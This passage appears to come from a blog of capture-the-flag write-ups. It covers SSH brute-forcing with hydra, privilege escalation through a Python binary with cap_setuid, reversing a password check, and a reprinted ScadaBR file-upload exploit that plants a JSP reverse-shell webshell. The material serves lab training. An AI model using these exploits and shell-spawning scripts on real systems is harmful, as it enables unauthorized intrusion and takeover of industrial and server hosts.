[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: syslog
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: systemd-coredump
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: systemd-network
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: systemd-resolve
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: systemd-timesync
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: tcpdump
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: tss
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: ubuntu
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: fwupd-refresh
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: uucp
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: uuidd
[+] 10.10.12.158:79       - 10.10.12.158:79 - Found user: www-data
[+] 10.10.12.158:79       - 10.10.12.158:79 Users found: _apt, backup, bin, daemon, fwupd-refresh, games, gnats, irc, landscape, list, lp, lxd, mail, man, messagebus, news, nobody, pollinate, proxy, root, sshd, sync, sys, syslog, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tcpdump, tss, ubuntu, uucp, uuidd, www-data
[*] 10.10.12.158:79       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ok so now I think I need to find a user who has actually logged in recently and try it from that account.

```
Login: ubuntu                           Name: Ubuntu
Directory: /home/ubuntu                 Shell: /bin/bash
Last login Thu Jun 26 23:30 (UTC) on pts/0 from 10.13.57.153
No mail.
No Plan.
```

`root` and `ubuntu` have logged in before so far. So do we just simply brute force these users?

`hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://10.10.12.158 -t64`

`64` might be too many threads, but `4` feels too low - `-vv` can be used to check it’s working and not lagging out.

`hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://10.10.7.87 -t 4 -W 3 -vV`

Even slower command with 3 second break because I think that before it wasn’t even trying most of the passwords.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316798/image_t3uwyl.png)

Just had a brain wave - it’s one of these guys!!

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316800/image_n3pbtb.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316803/image_svdnfr.png)

`ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=` - that looks like a password to me. BUT IT DIDN’T WORK WITH SSH. Oh, it could be Base64 encoded.

`echo "ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=" | base64 --decode`

`fabiano:o3jVTktarGQI07q`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316805/image_jbztce.png)

Wow, that was insane but we are in.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316808/image_ngqdik.png)

So it appears we don’t have access to `/root` - which is pretty obvious. So most likely we need to find a privilege escalation somewhere.

Tried `sudo -l` but this user doesn’t have permission to run it. So let’s look at the `sudo` version.

`sudo -V`

```
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Searchsploit doesn’t show anything interesting.

I’ve checked, files, hidden files, ssh keys, command history.

```
fabiano@tryhackme-2204:/home/ubuntu$ ls -la
total 32
drwxr-xr-x 4 ubuntu ubuntu 4096 Jun 26 23:10 .
drwxr-xr-x 6 root   root   4096 Jun 26 21:19 ..
lrwxrwxrwx 1 ubuntu ubuntu    9 Oct 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Oct 22  2024 .cache
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Oct 22  2024 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Oct 22  2024 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu  770 Jun 26 23:10 .viminfo
```

`ubuntu` directory looks interesting. Nope, can’t read the `ssh` folder.

I went back to basics and ran linPEAS.

```
╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

Files with capabilities (limited to 50):
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/snap/core22/1621/usr/bin/ping cap_net_raw=ep
/snap/core22/2010/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

`/usr/bin/python3.10 cap_setuid=ep` - this line was highlighted orange which means it’s likely vulnerable. We can check that this has `cap_setuid` capability.

`getcap /usr/bin/python3.10`

Which should output: `/usr/bin/python3.10 cap_setuid=ep` 

```python
import os

# Switch to root user (UID 0)
os.setuid(0)

# Confirm the UID has been switched
print(f"UID after setuid: {os.getuid()}")

# Spawn a root shell
os.system("/bin/bash")
```

```
fabiano@tryhackme-2204:~$ python3 exploit.py
UID after setuid: 0
root@tryhackme-2204:~# 
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316811/image_ztarlr.png)

### Thoughts

I did not enjoy this challenge at all. It’s not a beginner challenge in the slightest. It has an insane amount of rabbit holes and just pure randomness. The challenge leads you to believe you need to brute force, but all the random names on the website are actually the usernames, and you need to use them for a completely unrelated port. Probably the worst challenge of the entire event.

## Access Granted

Category: 

### Description

ZeroTrace intercepts a suspicious HMI login module on the plant floor. Reverse the binary logic to reveal the access key and slip past digital defences.

Flag: `THM{s0meth1ng_inthe_str1ng_she_knows}`

### Write-up

`strings access_granted`

```
/lib64/ld-linux-x86-64.so.2
        uBb
mgUa
libc.so.6
exit
fopen
strncmp
puts
__stack_chk_fail
stdin
printf
fgets
read
stdout
fclose
__cxa_finalize
setvbuf
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
flag.txt
Flag file not found!
Enter the password : 
processing...
Access Granted!
Wrong Password!
:*3$"
industrial
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
access_granted.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strncmp@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
fclose@@GLIBC_2.2.5
pass
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setvbuf@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
print_flag
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo "test" > flag.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ strings access_granted
/lib64/ld-linux-x86-64.so.2
        uBb
mgUa
libc.so.6
exit
fopen
strncmp
puts
__stack_chk_fail
stdin
printf
fgets
read
stdout
fclose
__cxa_finalize
setvbuf
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
flag.txt
Flag file not found!
Enter the password : 
processing...
Access Granted!
Wrong Password!
:*3$"
industrial
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
access_granted.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strncmp@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
fclose@@GLIBC_2.2.5
pass
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setvbuf@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
print_flag
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ./access_granted      
Enter the password : test

processing...
Wrong Password!
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ strings access_granted
/lib64/ld-linux-x86-64.so.2
        uBb
mgUa
libc.so.6
exit
fopen
strncmp
puts
__stack_chk_fail
stdin
printf
fgets
read
stdout
fclose
__cxa_finalize
setvbuf
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
flag.txt
Flag file not found!
Enter the password : 
processing...
Access Granted!
Wrong Password!
:*3$"
industrial
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
access_granted.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strncmp@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
fclose@@GLIBC_2.2.5
pass
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setvbuf@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
print_flag
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

So this one is fairly straight-forward, it’s looking for a password. It’s not in the strings so it’s probably somewhere in the code. We can look in Ghidra, look at the code logic and go from there.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316813/image_na7cyo.png)

`main` has a variable called `iVarl` which takes `pass` and then checks that against user input. If it matches, then you have the right password and you’re in. If we then go through the Symbol Tree we can find `pass` and right there in plain text you can see `industrial` as the password that it check against.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316815/image_iv56r1.png)

```
Enter the password : industrial

processing...Access Granted!
test
```

`nc 10.10.138.69 9009`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316817/image_r6eiy1.png)

### Thoughts

Generally an okay challenge. I do like to use Ghidra. I was struggling with this challenge until I just happened to find the password randomly.

## Brr v1

Category: Web

### Description

A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack. 

Flag: `THM{rce_archieved_through_script_injection}`

### Write-up

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316819/image_xkbpwv.png)

`nmap -A -T4 10.10.217.5`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 05:12 EDT
Nmap scan report for 10.10.217.5
Host is up (0.028s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 07:d8:c1:ec:ab:d5:b6:85:34:0d:73:19:8c:4a:e1:39 (ECDSA)
|_  256 4f:e6:e2:05:dd:a8:25:d3:29:4e:b1:94:62:12:f2:fe (ED25519)
80/tcp   open  http    WebSockify Python/3.12.3
|_http-title: Error response
|_http-server-header: WebSockify Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.12.3
|     Date: Sun, 29 Jun 2025 09:12:33 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 355
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.12.3
|     Date: Sun, 29 Jun 2025 09:12:34 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 360
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: 501 - Server does not support this operation.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: ScadaBR CTF
|_http-server-header: Apache-Coyote/1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=6/29%Time=68610383%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,21C,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20
SF:WebSockify\x20Python/3\.12\.3\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x20
SF:09:12:33\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;c
SF:harset=utf-8\r\nContent-Length:\x20355\r\n\r\n<!DOCTYPE\x20HTML>\n<html
SF:\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>
SF:Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<bo
SF:dy>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405</p>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20Allowed\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20405\x20-\x
SF:20Specified\x20method\x20is\x20invalid\x20for\x20this\x20resource\.</p>
SF:\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,22D,"HTTP/1\.1\x20
SF:501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nServer:\x20WebSockify\
SF:x20Python/3\.12\.3\r\nDate:\x20Sun,\x2029\x20Jun\x202025\x2009:12:34\x2
SF:0GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;charset=utf-
SF:8\r\nContent-Length:\x20360\r\n\r\n<!DOCTYPE\x20HTML>\n<html\x20lang=\"
SF:en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x2
SF:0charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20re
SF:sponse</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Error\x20code:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Message:\x20Unsupported\x20method\x20\('OPTIONS'\)\.</p>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20501\x20
SF:-\x20Server\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\
SF:x20\x20\x20</body>\n</html>\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n
SF:<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<t
SF:itle>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x
SF:20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RT
SF:SP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20e
SF:xplanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupporte
SF:d\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT     ADDRESS
1   8.00 ms 10.21.0.1
2   8.00 ms 10.10.217.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.54 seconds
```

`10.10.217.5:8080` - leads you to an actual working site.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316831/image_qxjlps.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316834/image_myhnay.png)

`admin:admin` - we’re in.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316838/image_eljkmp.png)

Tried `ssh` with those credentials but it rejects the connection because it’s expecting a key.

The challenge hint talks about an outdated instance. This would seem like the likely thing to pull on and see if we can find a vulnerability for this version (which I don’t know at this point).

https://github.com/snowwindwaverider/mango

Found this but it’s 15 years old and I have no idea if it’s relevant.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316842/image_z1gowv.png)

Ok so we found some chatter on StackOverflow about it. So ScadaBR is the new off-shoot from the original stack. Still no idea what version it is though.

`searchsploit scadabr`

```
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (1)                                                                   | windows/webapps/49734.py
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (2)                                                                   | linux/webapps/49735.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Worth a shot.

[ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (2)](https://www.exploit-db.com/exploits/49735)

```python
#!/usr/bin/python

import requests,sys,time

if len(sys.argv) <=6:
    print('[x] Missing arguments ... ')
    print('[>] Usage: python LinScada_RCE.py <TargetIp> <TargetPort> <User> <Password> <Reverse_IP> <Reverse_Port>')
    print('[>] Example: python LinScada_RCE.py 192.168.1.24 8080 admin admin 192.168.1.50 4444')
    sys.exit(0)
else:   
    time.sleep(1)

host = sys.argv[1]
port = sys.argv[2]
user = sys.argv[3]
passw = sys.argv[4]
rev_host = sys.argv[5]
rev_port = sys.argv[6]

flag = False
LOGIN = 'http://'+host+':'+port+'/ScadaBR/login.htm'
PROTECTED_PAGE = 'http://'+host+':'+port+'/ScadaBR/view_edit.shtm'

banner = r'''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \______   \______   \      |
|   \_____  \_/ ___\\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  >____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    > ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload   |
|    > Exploit Author : Fellipe Oliveira                            |
|    > Exploit for Linux Systems                                    |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

def main():
    payload = {
        'username': user,
        'password': passw
    }

    print(banner)
    time.sleep(2)
   
    with requests.session() as s:
        s.post(LOGIN, data=payload)
        response = s.get(PROTECTED_PAGE)

        print "[+] Trying to authenticate "+LOGIN+"..."
        if response.status_code == 200:
            print "[+] Successfully authenticated! :D~\n"
            time.sleep(2)
        else:
            print "[x] Authentication failed :("
            sys.exit(0)

        burp0_url = "http://"+host+":"+port+"/ScadaBR/view_edit.shtm"
        burp0_cookies = {"JSESSIONID": "8DF449C72D2F70704B8D997971B4A06B"}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------32124376735876620811763441977", "Origin": "http://"+host+":"+port+"/", "Connection": "close", "Referer": "http://"+host+":"+port+"/ScadaBR/view_edit.shtm", "Upgrade-Insecure-Requests": "1"}
        burp0_data = "-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_369755\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"webshell.jsp\"\r\nContent-Type: image/png\r\n\r\n <%@page import=\"java.lang.*\"%>\n<%@page import=\"java.util.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n\n<%\nclass StreamConnector extends Thread {\n    InputStream is;\n    OutputStream os;\n    StreamConnector(InputStream is, OutputStream os) {\n        this.is = is;\n        this.os = os;\n    }\n    public void run() {\n        BufferedReader isr = null;\n        BufferedWriter osw = null;\n        try {\n            isr = new BufferedReader(new InputStreamReader(is));\n            osw = new BufferedWriter(new OutputStreamWriter(os));\n            char buffer[] = new char[8192];\n            int lenRead;\n            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {\n                osw.write(buffer, 0, lenRead);\n                osw.flush();\n            }\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n        try {\n            if (isr != null)\n                isr.close();\n            if (osw != null)\n                osw.close();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n}\n%>\n\n<h1>Payload JSP to Reverse Shell</h1>\n<p>Run nc -l 1234 on your client (127.0.0.1) and click Connect. This JSP will start a bash shell and connect it to your nc process</p>\n<form method=\"get\">\n\tIP Address<input type=\"text\" name=\"ipaddress\" size=30 value=\"127.0.0.1\"/>\n\tPort<input type=\"text\" name=\"port\" size=10 value=\"1234\"/>\n\t<input type=\"submit\" name=\"Connect\" value=\"Connect\"/>\n</form>\n\n<%\n    String ipAddress = request.getParameter(\"ipaddress\");\n    String ipPort = request.getParameter(\"port\");\n    Socket sock = null;\n    Process proc = null;\n    if (ipAddress != null && ipPort != null) {\n        try {\n            sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n            System.out.println(\"socket created: \" + sock.toString());\n            Runtime rt = Runtime.getRuntime();\n            proc = rt.exec(\"/bin/bash\");\n            System.out.println(\"process /bin/bash started: \" + proc.toString());\n            StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());\n            System.out.println(\"outputConnector created: \" + outputConnector.toString());\n            StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());\n            System.out.println(\"inputConnector created: \" + inputConnector.toString());\n            outputConnector.start();\n            inputConnector.start();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n    if (sock != null && proc != null) {\n        out.println(\"<div class='separator'></div>\");\n        out.println(\"<p>Process /bin/bash, running as (\" + proc.toString() + \", is connected to socket \" + sock.toString() + \".</p>\");\n    }\n%>\n\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n-----------------------------32124376735876620811763441977--\r\n"
        getdata = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

        print('[>] Attempting to upload .jsp Webshell...')
        time.sleep(1)
        print('[>] Verifying shell upload...\n')
        time.sleep(2)
        
        if getdata.status_code == 200:
            print('[+] Upload Successfuly! \n')
            
            for num in range(1,1000):
                PATH = 'http://'+host+':'+port+'/ScadaBR/uploads/%d.jsp' % (num)
                find = s.get(PATH)

                if find.status_code == 200:
                    print('[+] Webshell Found in: http://'+host+':'+port+'/ScadaBR/uploads/%d.jsp' % (num))
                    print('[>] Spawning Reverse Shell...\n')
                    time.sleep(3)
                    
                    burp0_url = "http://"+host+":"+port+"/ScadaBR/uploads/%d.jsp?ipaddress=%s&port=%s&Connect=Connect" % (num,rev_host,rev_port)
                    burp0_cookies = {"JSESSIONID": "8DF449C72D2F70704B8D997971B4A06B"}
                    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
                    r = s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
                    time.sleep(5)
                    
                    if len(r.text) > 401:
                        print('[+] Connection received')
                        sys.exit(0)
                    else:
                        print('[x] Failed to receive reverse connection ...\n')
                        
                elif num == 999:
                    print('[x] Failed to found Webshell ... ')
                    
        else:
            print('Reason:'+getdata.reason+' ')
            print('Exploit Failed x_x')

if __name__ == '__main__':
    main()
```

`nc -lvnp 4444`

`python2 [scadabr.py](http://scadabr.py/) 10.10.217.5 8080 admin admin 10.21.213.185 4444`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316840/image_h2ea4a.png)

### Thoughts

No idea why this is considered a `web` challenge - it’s really not. Super confusing.

## Brr v2

Category: OT

### Description

